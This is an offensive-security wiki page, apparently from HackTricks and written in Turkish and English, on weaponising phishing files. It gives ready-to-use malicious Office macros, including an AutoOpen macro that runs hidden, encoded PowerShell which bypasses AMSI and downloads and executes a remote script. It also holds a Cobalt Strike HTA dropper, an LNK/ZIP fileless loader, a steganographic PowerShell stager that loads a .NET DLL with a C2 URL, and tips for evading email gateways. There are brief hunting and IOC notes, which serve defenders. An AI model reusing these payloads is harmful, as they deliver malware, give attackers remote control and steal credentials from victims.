# Phishing Dosyaları & Belgeleri

{{#include ../../banners/hacktricks-training.md}}

## Office Belgeleri

Microsoft Word, bir dosyayı açmadan önce dosya veri doğrulaması gerçekleştirir. Veri doğrulaması, OfficeOpenXML standardına karşı veri yapı tanımlaması şeklinde yapılır. Veri yapı tanımlaması sırasında herhangi bir hata oluşursa, analiz edilen dosya açılmayacaktır.

Genellikle, makro içeren Word dosyaları `.docm` uzantısını kullanır. Ancak dosya uzantısını değiştirerek dosyayı yeniden adlandırmak ve yine de makro çalıştırma yeteneğini korumak mümkündür.\
Örneğin, RTF dosyaları tasarım gereği makroları desteklemez, ancak DOCM bir dosya RTF olarak yeniden adlandırıldığında Microsoft Word tarafından işlenir ve makro çalıştırabilir.\
Aynı iç yapılar ve mekanizmalar Microsoft Office Suite (Excel, PowerPoint etc.) tüm yazılımlarında geçerlidir.

Aşağıdaki komutu, bazı Office programları tarafından hangi uzantıların çalıştırılacağını kontrol etmek için kullanabilirsiniz:
```bash
assoc | findstr /i "word excel powerp"
```
DOCX files referencing a remote template (File –Options –Add-ins –Manage: Templates –Go) that includes macros can “execute” macros as well.

### Harici Resim Yükleme

Şuraya gidin: _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References, **Filed names**: includePicture, and **Filename or URL**:_ http://<ip>/whatever

![](<../../images/image (155).png>)

### Macros Backdoor

Belgeden arbitrary code çalıştırmak için macros kullanmak mümkündür.

#### Autoload functions

Ne kadar yaygınlarsa, AV'nin onları tespit etme olasılığı o kadar yüksektir.

- AutoOpen()
- Document_Open()

#### Macros Code Examples
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### Meta verileri elle kaldır

Şuraya gidin: **Dosya > Bilgi > Belgeyi Denetle > Belgeyi Denetle**, bu Belge Denetçisi'ni açacaktır. **Denetle**'ye tıklayın ve ardından **Belge Özellikleri ve Kişisel Bilgiler**'in yanındaki **Tümünü Kaldır**'a tıklayın.

#### Doc Uzantısı

İşiniz bitince, **Save as type** açılır menüsünden formatı **`.docx`**'ten **Word 97-2003 `.doc`**'a değiştirin.\
Bunu yapın çünkü **`.docx` içinde macro kaydedemezsiniz** ve macro-enabled **`.docm`** uzantısı hakkında bir **olumsuz algı** vardır (ör. küçük resim simgesinde büyük bir `!` bulunur ve bazı web/e-posta ağ geçitleri bunları tamamen engeller). Bu nedenle, bu **eski `.doc` uzantısı en iyi uzlaşıdır**.

#### Malicious Macros Generators

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## HTA Dosyaları

HTA, **HTML ve betik dillerini (ör. VBScript ve JScript) birleştiren** bir Windows programıdır. Kullanıcı arayüzünü oluşturur ve bir tarayıcının güvenlik modeli kısıtlamaları olmadan "fully trusted" bir uygulama olarak çalışır.

Bir HTA, **`mshta.exe`** kullanılarak çalıştırılır; bu genellikle **Internet Explorer** ile birlikte **yüklü** gelir ve bu da **`mshta`'yı IE'ye bağımlı** kılar. Bu nedenle, IE kaldırıldıysa, HTA'lar çalıştırılamaz.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## NTLM Kimlik Doğrulamasını Zorlamak

NTLM kimlik doğrulamasını **"uzaktan" zorlamak** için birkaç yöntem vardır; örneğin, kullanıcının erişeceği e-postalara veya HTML'e **görünmez resimler** ekleyebilirsiniz (hatta HTTP MitM?). Veya kurbana klasörü açmak sadece bir kimlik doğrulamayı **tetikleyecek** **dosyaların adresini** gönderebilirsiniz.

**Aşağıdaki sayfalarda bu fikirleri ve daha fazlasını inceleyin:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Yalnızca hash'i veya kimlik doğrulamayı çalamayacağınızı unutmayın; aynı zamanda **NTLM relay attacks** gerçekleştirebilirsiniz:

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

Oldukça etkili kampanyalar, iki meşru sahte belge (PDF/DOCX) ve kötü amaçlı bir .lnk içeren bir ZIP gönderir. Hile şu ki, gerçek PowerShell loader ZIP’in ham baytları içinde benzersiz bir işaretçiden sonra saklanır ve .lnk bunu tamamen bellekte kazır ve çalıştırır.

.lnk PowerShell tek satırı tarafından uygulanan tipik akış:

1) Desktop, Downloads, Documents, %TEMP%, %ProgramData% ve geçerli çalışma dizininin üstü gibi yaygın yollarda orijinal ZIP’i bulun.
2) ZIP baytlarını okuyun ve sabit kodlanmış bir işaretçi bulun (ör. xFIQCV). İşaretçiden sonra gelen her şey gömülü PowerShell payload'ıdır.
3) ZIP’i %ProgramData%’ya kopyalayın, orada çıkarın ve meşru görünmesi için dekoy .docx’i açın.
4) Mevcut süreç için AMSI’yi atlatın: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Sonraki aşamayı deobfuskasyon yapın (ör. tüm # karakterlerini kaldırın) ve bellekte çalıştırın.

Gömülü aşamayı kazıp çalıştırmak için örnek PowerShell iskeleti:
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
Notes
- Teslimat sıklıkla saygın PaaS alt alan adlarını (örn., *.herokuapp.com) kötüye kullanır ve payloads'ı gate edebilir (IP/UA'ya göre zararsız ZIP'ler sunma).
- Bir sonraki aşama sık sık base64/XOR shellcode'u çözer ve disk artefaktlarını en aza indirmek için Reflection.Emit + VirtualAlloc ile yürütür.

Persistence used in the same chain
- COM TypeLib hijacking of the Microsoft Web Browser control so that IE/Explorer or any app embedding it re-launches the payload automatically. See details and ready-to-use commands here:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- Arşiv verisine eklenmiş ASCII marker string içeren ZIP dosyaları (örn., xFIQCV).
- .lnk; ZIP'i bulmak için üst/kullanıcı klasörlerini listeler ve bir decoy document açar.
- AMSI'ye müdahale [System.Management.Automation.AmsiUtils]::amsiInitFailed aracılığıyla.
- Güvenilir PaaS domainleri altında barındırılan linklerle sonlanan uzun süre çalışan business thread'ler.

## Steganography-delimited payloads in images (PowerShell stager)

Recent loader chains deliver an obfuscated JavaScript/VBS that decodes and runs a Base64 PowerShell stager. That stager downloads an image (often GIF) that contains a Base64-encoded .NET DLL hidden as plain text between unique start/end markers. The script searches for these delimiters (examples seen in the wild: «<<sudo_png>> … <<sudo_odt>>>»), extracts the between-text, Base64-decodes it to bytes, loads the assembly in-memory and invokes a known entry method with the C2 URL.

İş akışı
- Stage 1: Arşivlenmiş JS/VBS dropper → gömülü Base64'i çözer → PowerShell stager'ı -nop -w hidden -ep bypass ile başlatır.
- Stage 2: PowerShell stager → görüntüyü indirir, marker-ile ayrılmış Base64'i carve eder, .NET DLL'i belleğe yükler ve bilinen bir metodu (ör., VAI) C2 URL ve seçenekleri geçerek çağırır.
- Stage 3: Loader nihai payload'ı alır ve genellikle trusted binary'ye (çoğunlukla MSBuild.exe) process hollowing ile inject eder. Process hollowing ve trusted utility proxy execution hakkında daha fazla bilgi için bakınız:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

PowerShell example to carve a DLL from an image and invoke a .NET method in-memory:

<details>
<summary>PowerShell stego payload extractor and loader</summary>
```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
[string]$Url    = 'https://example.com/payload.gif',
[string]$StartM = '<<sudo_png>>',
[string]$EndM   = '<<sudo_odt>>',
[string]$EntryType = 'Loader',
[string]$EntryMeth = 'VAI',
[string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```
</details>

Notlar
- Bu, ATT&CK T1027.003 (steganography/marker-hiding) tekniğidir. Markers kampanyalar arasında değişir.
- AMSI/ETW bypass ve string deobfuscation genellikle assembly yüklemeden önce uygulanır.
- Avlama: indirilen görselleri bilinen ayırıcılar için tara; görsellere erişen PowerShell süreçlerini tespit edin ve hemen Base64 blob'larını decode edenleri yakalayın.

See also stego tools and carving techniques:

{{#ref}}
../../crypto-and-stego/stego-tricks.md
{{#endref}}

## JS/VBS droppers → Base64 PowerShell staging

Tekrarlanan bir başlangıç aşaması, arşiv içinde teslim edilen küçük, ağır şekilde obfuskelenmiş bir `.js` veya `.vbs` dosyasıdır. Tek amacı gömülü bir Base64 string'i decode etmek ve sonraki aşamayı HTTPS üzerinden bootstrap etmek için `-nop -w hidden -ep bypass` ile PowerShell'i çalıştırmaktır.

Skeleton logic (abstract):
- Kendi dosya içeriğini oku
- Çöp dizgiler arasındaki Base64 blob'unu bul
- ASCII PowerShell'e decode et
- `wscript.exe`/`cscript.exe` ile `powershell.exe`'yi çağırarak çalıştır

Hunting cues
- Komut satırında `-enc`/`FromBase64String` içeren `powershell.exe` başlatan arşivlenmiş JS/VBS ekleri.
- Kullanıcı temp yollarından `powershell.exe -nop -w hidden` başlatan `wscript.exe`.

## Windows files to steal NTLM hashes

Aşağıdaki sayfaya bakın: **places to steal NTLM creds**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}


## Referanslar

- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [Unit 42 – PhantomVAI Loader Delivers a Range of Infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)

{{#include ../../banners/hacktricks-training.md}}
